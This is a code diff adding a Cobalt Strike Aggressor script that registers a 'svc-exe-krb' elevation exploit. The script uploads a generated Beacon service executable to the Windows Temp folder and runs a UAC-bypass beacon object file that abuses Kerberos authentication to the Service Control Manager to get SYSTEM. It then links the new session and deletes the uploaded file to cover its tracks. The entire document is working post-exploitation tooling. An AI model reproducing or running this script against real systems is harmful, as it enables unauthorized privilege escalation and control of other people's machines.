@@ -1,0 +1,34 @@
+sub svc_krb_elevator {
+	local('$barch $payload $filepath $handle $bof');
+
+	# acknowledge command
+	btask($1, "Task Beacon to run " . listener_describe($2) . " via Service Control Manager");
+
+	# arch of session
+	$barch  = barch($1);
+
+	# generate payload
+	$payload = artifact_payload($2, "svcexe", $barch, "process", "None");
+
+    # filepath
+    $filepath = "C:\\Windows\\Temp\\UACBypassedService.exe";
+
+	# upload to target
+	bupload_raw!($1, $filepath, $payload);
+
+	# get bof
+	$handle = openf(getFileProper(script_resource("Release"), "scmuacbypass. $+ $barch $+ .o"));
+	$bof = readb($handle, -1);
+	closef($handle);
+
+	# run
+	beacon_inline_execute($1, $bof, "go");
+
+	# link
+	beacon_link($1, $null, $2);
+
+	# delete file
+	brm!($1, $filepath);
+}
+
+beacon_exploit_register("svc-exe-krb", "Get SYSTEM via an executable run as a service via Kerberos authentication", &svc_krb_elevator);
